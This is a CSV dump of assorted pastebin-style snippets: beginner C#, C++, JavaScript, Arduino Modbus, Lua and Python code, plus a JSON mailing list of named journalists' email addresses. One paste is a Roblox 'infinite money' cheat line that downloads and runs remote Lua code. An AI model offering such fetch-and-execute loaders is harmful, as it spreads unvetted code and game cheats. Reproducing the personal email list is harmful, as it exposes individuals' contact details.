id,title,username,language,date,content
6QK11jry,Untitled,GigaOrts,C#,Thursday 24th of August 2023 09:56:51 AM CDT,"static void Main(string[] args)
{
    const ConsoleColor redColor = ConsoleColor.Red;
    const ConsoleColor greenColor = ConsoleColor.Green;
    const ConsoleColor blueColor = ConsoleColor.Blue;

    const string MenuRedColor = ""1"";
    const string MenuGreenColor = ""2"";
    const string MenuBlueColor = ""3"";

    Console.WriteLine($""У нас на выбор имеются следующие цвета:"" +
        $""{redColor},"" +
        $""{greenColor},"" +
        $""{blueColor},"");

    switch (Console.ReadLine())
    {
        case MenuRedColor:
            Console.ForegroundColor = redColor;
            break;
        case MenuGreenColor:
            Console.ForegroundColor = greenColor;
            break;
        case MenuBlueColor:
            Console.ForegroundColor = blueColor;
            break;
    }
}"
7vLebuzd,Kim and Refrigerators SRBD,Mohammad_Dipu_Sultan,C++,Thursday 24th of August 2023 09:46:40 AM CDT,"#include<bits/stdc++.h>
using namespace std;

int x[16], y[16];
int n, ans;
vector<int> seen;

void kim(int cur, int indcnt, int cost){

	if(indcnt==n){

		ans=min(ans, cost+abs(x[cur]-x[1])+abs(y[cur]-y[1]));
		return;
	}

	for(int i=2; i<n+2; i++){

		if(seen[i]==0){
			seen[i]=1;
			kim(i, indcnt+1, cost+abs(x[cur]-x[i])+abs(y[cur]-y[i]));
			seen[i]=0;
		}
	}
}

int main(){

	int t=10;
	int cases=1;
	while(t--){
		cin >> n;
		seen.assign(n+2, 0);

		for(int i=0; i<n+2; i++){
			cin >> x[i] >> y[i];
		}

		ans=INT_MAX;

		kim(0, 0, 0);

		cout << ""# "" << cases++ << "" "" << ans << endl;
	}
	return 0;
}"
MeKC1U8g,Roblox Destruction Simulator OP Script (INF MONEY),LisMeme0123liskigi,Lua,Thursday 24th of August 2023 09:44:47 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/0123liskigi/Destruction-Simulator/work/DESTRUCTION!.lua""))()"
xCiASWLj,modal-video-on-click,catfield,JavaScript,Thursday 24th of August 2023 09:30:45 AM CDT,"<script>
var scriptUrl = 'https://www.youtube.com/s/player/21812a9c/www-widgetapi.vflset/www-widgetapi.js';

try {
    var ttPolicy = window.trustedTypes.createPolicy(""youtube-widget-api"", {
        createScriptURL: function (x) {
            return x;
        }
    });
    scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}

var YT = YT || {
    loading: 0,
    loaded: 0
};

var YTConfig = window.YTConfig || {
    host: ""https://www.youtube.com""
};

let player;
let apiReady = false;
let modalOpened = false; // Added flag to track modal state

// Load the YouTube API
function loadYouTubeAPI() {
    if (!YT.loading) {
        YT.loading = 1;
        var a = document.createElement(""script"");
        a.type = ""text/javascript"";
        a.id = ""www-widgetapi-script"";
        a.src = scriptUrl;
        a.async = true;

        var c = document.currentScript;
        if (c) {
            var n = c.nonce || c.getAttribute(""nonce"");
            if (n) {
                a.setAttribute(""nonce"", n);
            }
        }

        var b = document.getElementsByTagName(""script"")[0];
        b.parentNode.insertBefore(a, b);
    }
}

function onYouTubeIframeAPIReady() {
    apiReady = true;

    if (modalOpened) {
        ModalFlexAndPlayVideo();
    }
}

function resetPlayerAndModal() {
    if (player) {
        player.pauseVideo();
        player.destroy();
    }
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'none';
    modalOpened = false;
}

function ModalFlexAndPlayVideo() {
    if (apiReady) {
        player = new YT.Player('muteVideoYoutube', {
            events: {
                'onReady': function (event) {
                    event.target.playVideo();
                    var modalSection = document.querySelector('.fixed-modal-section');
                    modalSection.style.display = 'flex';
                    modalOpened = true;
                    console.log(""Video playing"");
                }
            }
        });
    } else {
        console.log(""API is not ready yet."");
        loadYouTubeAPI();
        console.log(""Loading YouTube API..."");
    }
}

document.querySelector('.modal-close-btn').addEventListener('click', resetPlayerAndModal);
document.querySelector('.daria-testimonial-photo-block').addEventListener('click', ModalFlexAndPlayVideo);
</script>"
YSku8HtH,modbus_slave_to_float,mikroavr,Arduino,Thursday 24th of August 2023 09:17:56 AM CDT,"#include <avr/wdt.h>
#include <Wire.h>
//#include <LiquidCrystal_I2C.h>
#include <Adafruit_ADS1015.h>


#include <SimpleModbusSlave.h>
/* This example code has 9 holding registers. 6 analogue inputs, 1 button, 1 digital output
   and 1 register to indicate errors encountered since started.
   Function 5 (write single coil) is not implemented so I'm using a whole register
   and function 16 to set the onboard Led on the Atmega328P.
   
   The modbus_update() method updates the holdingRegs register array and checks communication.

   Note:  
   The Arduino serial ring buffer is 128 bytes or 64 registers.
   Most of the time you will connect the arduino to a master via serial
   using a MAX485 or similar.
 
   In a function 3 request the master will attempt to read from your
   slave and since 5 bytes is already used for ID, FUNCTION, NO OF BYTES
   and two BYTES CRC the master can only request 122 bytes or 61 registers.
 
   In a function 16 request the master will attempt to write to your 
   slave and since a 9 bytes is already used for ID, FUNCTION, ADDRESS, 
   NO OF REGISTERS, NO OF BYTES and two BYTES CRC the master can only write
   118 bytes or 59 registers.
 
   Using the FTDI USB to Serial converter the maximum bytes you can send is limited 
   to its internal buffer which is 60 bytes or 30 unsigned int registers. 
 
   Thus:
 
   In a function 3 request the master will attempt to read from your
   slave and since 5 bytes is already used for ID, FUNCTION, NO OF BYTES
   and two BYTES CRC the master can only request 54 bytes or 27 registers.
 
   In a function 16 request the master will attempt to write to your 
   slave and since a 9 bytes is already used for ID, FUNCTION, ADDRESS, 
   NO OF REGISTERS, NO OF BYTES and two BYTES CRC the master can only write
   50 bytes or 25 registers.
 
   Since it is assumed that you will mostly use the Arduino to connect to a 
   master without using a USB to Serial converter the internal buffer is set
   the same as the Arduino Serial ring buffer which is 128 bytes.
*/
 

// Using the enum instruction allows for an easy method for adding and 
// removing registers. Doing it this way saves you #defining the size 
// of your slaves register array each time you want to add more registers
// and at a glimpse informs you of your slaves register layout.

//////////////// registers of your slave ///////////////////
enum 
{     
  // just add or remove registers and your good to go...
  // The first register starts at address 0
  ADC0,     
  ADC1,        
  ADC2,
  ADC3,
  ADC4,
  ADC5,
  ADC6,
  ADC7,
  ADC8,
  ADC9,
  ADC10,
  ADC11,
  TOTAL_ERRORS,
  // leave this one
  TOTAL_REGS_SIZE 
  // total number of registers for function 3 and 16 share the same register array
};

unsigned int holdingRegs[TOTAL_REGS_SIZE]; // function 3 and 16 register array
////////////////////////////////////////////////////////////

//LiquidCrystal_I2C lcd(20, 4);
Adafruit_ADS1115 ads;  /* Use this for the 16-bit version */
int16_t adc0, adc1, adc2, adc3;
float v1, v2, v3, v4;
//String line1, line2, line3, line4;

union Pun {
  float f; uint32_t u;
};

void setup()
{
  //pinMode(A0, OUTPUT);
  wdt_enable(WDTO_8S);
  //digitalWrite(A0, HIGH);
  //delay(2000);
  //digitalWrite(A0, LOW); 
  //lcd.autoAddress();
  //lcd.begin();
  
  /* parameters(long baudrate, 
                unsigned char ID, 
                unsigned char transmit enable pin, 
                unsigned int holding registers size,
                unsigned char low latency)
                
     The transmit enable pin is used in half duplex communication to activate a MAX485 or similar
     to deactivate this mode use any value < 2 because 0 & 1 is reserved for Rx & Tx.
     Low latency delays makes the implementation non-standard
     but practically it works with all major modbus master implementations.
  */
  ads.setGain(GAIN_TWOTHIRDS);  
  ads.begin();
  
  modbus_configure(9600, 1, 16, TOTAL_REGS_SIZE, 0);
 
 }

void loop()
{
  // modbus_update() is the only method used in loop(). It returns the total error
  // count since the slave started. You don't have to use it but it's useful
  // for fault finding by the modbus master.
  wdt_reset();
  holdingRegs[TOTAL_ERRORS] = modbus_update(holdingRegs);
   
  for ( int i = 0; i<4; i++){
     holdingRegs[i] = ads.readADC_SingleEnded(i);
     delayMicroseconds(50);   
  }
  v1 = (holdingRegs[0] * 0.1875)/1000;
  v2 = (holdingRegs[1] * 0.1875)/1000;
  v3 = (holdingRegs[2] * 0.1875)/1000;
  v4 = (holdingRegs[3] * 0.1875)/1000;

  encodeFloat(&holdingRegs[4], v1);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[6], v2);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[8], v3);
  delayMicroseconds(50);
  encodeFloat(&holdingRegs[10], v4);
  delayMicroseconds(50);
  
    //unsigned long teg = (unsigned long)holdingRegs[4] << 16 | holdingRegs[5];
  /*
  float dtTeg1 = decodeFloat(&holdingRegs[4]);
  float dtTeg2 = decodeFloat(&holdingRegs[6]);
  float dtTeg3 = decodeFloat(&holdingRegs[8]);
  float dtTeg4 = decodeFloat(&holdingRegs[10]);

  line1 = String(holdingRegs[0]) + "", "" + String(dtTeg1,5);
  line2 = String(holdingRegs[1]) + "", "" + String(dtTeg2,5);
  line3 = String(holdingRegs[2]) + "", "" + String(dtTeg3,5);
  line4 = String(holdingRegs[3]) + "", "" + String(dtTeg4,5);
  
  lcd.clear();
  lcd.setCursor(0,0);
  lcd.print(line1);
  
  lcd.setCursor(0,1);
  lcd.print(line2);
  
  lcd.setCursor(0,2);
  lcd.print(line3);

  lcd.setCursor(0,3);
  lcd.print(line4);
  delay(10);
  */
}

void encodeFloat(uint16_t *regs, float x){
  union Pun pun;
  pun.f = x;
  regs[0] = (pun.u>>16) & 0xFFFFU;
  regs[1] = pun.u & 0xFFFFU;
}

/*float decodeFloat(const uint16_t *regs){
 union Pun pun;
 pun.u = ((uint32_t)regs[0] << 16) | regs[1];
 return pun.f; 
}
*/
"
W2FnvV6w,poop,kizn,Lua,Thursday 24th of August 2023 09:01:57 AM CDT,"local caller = getScriptCaller()

function getDelta()
  local t = {}
  t.current = getLocalData(tostring(caller.id)..""shit"") or 0
  t.delta = math.random(5, 25)
  t.current = t.current + t.delta
  setLocalData(tostring(caller.id)..""shit"", t.current)
  return t
end

function updateTime()
  setLocalData(tostring(caller.id) .. 'timeshit', os.time())
end

function checkTime()
  local time = getLocalData(tostring(caller.id) .. 'timeshit')
  if not time then
    setLocalData(tostring(caller.id)..""timeshit"", 0)
    updateTime()
    return true
  end
  if time and os.time() - tonumber(time) > 24*60*60 then
    updateTime()
    return true
  end
  return false 
end

function enlarge()
  if isChat() then
    local user = (caller.username) and "" @""..caller.username.."" "" or caller.first_name.."" ""
    if checkTime() then
      local t = getDelta()
      return user.."", ты высрал "" .. t.delta .. "" см. говна. В твоей яме уже ""..t.current.."" см. говна""
    else
      return os.date(user .. ', ты уже срал сегодня! Приходи через %H часов %M минут', 45*60*60 - os.time() + tonumber(getLocalData(tostring(caller.id .. 'timeshit'))))
    end
  else
    return 'Юзай в чате, чтобы все видели, сколько ты насрал!'
  end
end

function printTop()
  local t = getAllUserData()
  local s = 'ДЛИНА ГОВНА В ЯМАХ ЧЛЕНОВ КОНФЫ\n'
  --local r = {}
  if not getUserCount() then
    return 'Используй в конфе!'
  end
  for i = 1, getUserCount() do
    if t[i] and t[i].id and getLocalData(tostring(t[i].id)..""shit"") then
      t[i].score = tonumber(getLocalData(tostring(t[i].id)..""shit""))
    else
      t[i] = nil
    end
  end
  local c = {}
  for i = 1, getUserCount() do
    if t[i] then
      table.insert(c, t[i])
    end
  end
  table.sort(c, function(a,b) return a.score > b.score end)
  for i = 1, #c do
    if c[i].first_name then
      s = s .. c[i].first_name .. ' - ' ..c[i].score .. ' см.\n'
    end
  end
  return s
end

if _ARGS == 'top' or _ARGS == 'топ' then
  return printTop()
end

return enlarge()"
tDxSGBS2,manifest.json,ManifoldHydra80,JSON,Thursday 24th of August 2023 08:52:57 AM CDT,"{
	""manifest_version"": 3,
	""name"": ""testcode"",
	""version"": ""1.0"",
	""content_scripts"": [
	{
			""js"": [""script.js""],
			""matches"": [""<all_urls>""]
			}
	]
}"
JGBGwbpt,script.js,ManifoldHydra80,JavaScript,Thursday 24th of August 2023 08:51:00 AM CDT,alert('hello word!')
C8WSgQSA,verificamultiplo,davegimo,Python,Thursday 24th of August 2023 08:40:40 AM CDT,"def verificaMultiplo(a,x,k):
    if isNull(a):
        return False
    
    return auxmultiplo(a,x,k,0)



def auxmultiplo(a,x,k,liv_corrente):
    if isNull(a):
        return True

    if liv_corrente > k:
        return info(a) % x == 0 and auxmultiplo(left(a),x,k,liv_corrente + 1) and auxmultiplo(right(a),x,k,liv_corrente + 1)
    else:
        return auxmultiplo(left(a),x,k,liv_corrente + 1) and auxmultiplo(right(a),x,k,liv_corrente + 1) "
h9WW8anK,Press report,liammcmullen,JSON,Thursday 24th of August 2023 08:36:32 AM CDT,"{
  ""Irish News"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Irish News Supplement"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Banbridge Chronicle"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com "",
    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ],
  ""Impartial Reporter"": [
    ""leighton.jones@newsquest.co.uk"",
    ""richie.beattie@newsquest.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""Lynn.Craig@heraldandtimes.co.uk""
  ],
  ""Daily Mirror"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""m.clowery@trinitymirror.com"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""michael.brown@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Belfast Telegraph"": [
    ""s.porter@mediahuis.co.uk"",
    ""i.hetherington@mediahuis.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""dhartnett@mediahuis.ie"",
    ""belebert@independent.ie"",
    ""a.lambert@mediahuis.co.uk"",
    ""a.bridgnell@mediahuis.co.uk"",
    ""caireen.porter@mediahuis.co.uk"",
    ""a.kane@mediahuis.co.uk"",
    ""SETFinance@mediahuis.ie"",
    ""gfrazer@sundaylife.co.uk""
  ],
  ""Newry Reporter"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com "",
    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ],
  ""Sunday Life"": [
    ""s.porter@belfasttelegraph.co.uk"",
    ""i.hetherington@belfasttelegraph.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""dhartnett@independent.ie"",
    ""belebert@independent.ie"",
    ""a.lambert@belfasttelegraph.co.uk"",
    ""a.bridgnell@mediahuis.co.uk"",
    ""caireen.porter@mediahuis.co.uk"",
    ""a.kane@mediahuis.co.uk"",
    ""SETFinance@mediahuis.ie"",
    ""gfrazer@sundaylife.co.uk""
  ],
  ""Sunday Mail"": [
    ""j.lynn@dailyrecord.co.uk"",
    ""charlie.smith@dailyrecord.co.uk"",
    ""i.steele@dailyrecord.co.uk"",
    ""t.heffernan@dailyrecord.co.uk"",
    ""a.reyburn@dailyrecord.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""adam.morrison@reachplc.com""
  ],
  ""Sunday Mirror"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""m.clowery@trinitymirror.com"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""adam.morrison@reachplc.com""
  ],
  ""Sunday People"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Sunday Post"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""tthorburn@dcthomson.co.uk"",
    ""gforester@dcthomson.co.uk"",
    ""edlowe@dcthomson.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""cbertie@dctmedia.co.uk"",
    ""lorrayne.brown@dcthomson.co.uk""
  ],
  ""Tyrone Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Donegal News Monday"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Finn Valley Voice"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Fermanagh Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Gaelic Life"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Strabane Chronicle"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Ulster Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Dungannon Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Donegal News Friday"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Alpha Titles"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""River Titles"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""peter.columb@iconicnews.ie""
  ],
  ""Daily Express"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
        ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Sunday Express"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
    ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""john.howard@reachplc.com"",
    ""adam.morrison@reachplc.com""
  ],
  ""Daily Star"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
     ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Sunday Star"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
    ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""john.howard@reachplc.com"",
    ""adam.morrison@reachplc.com""
  ],
  ""Mourne Observer"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Newtownards Chronicle"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""County Down Spectator"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Farm Week"": [
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com"",
    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ]
}
"
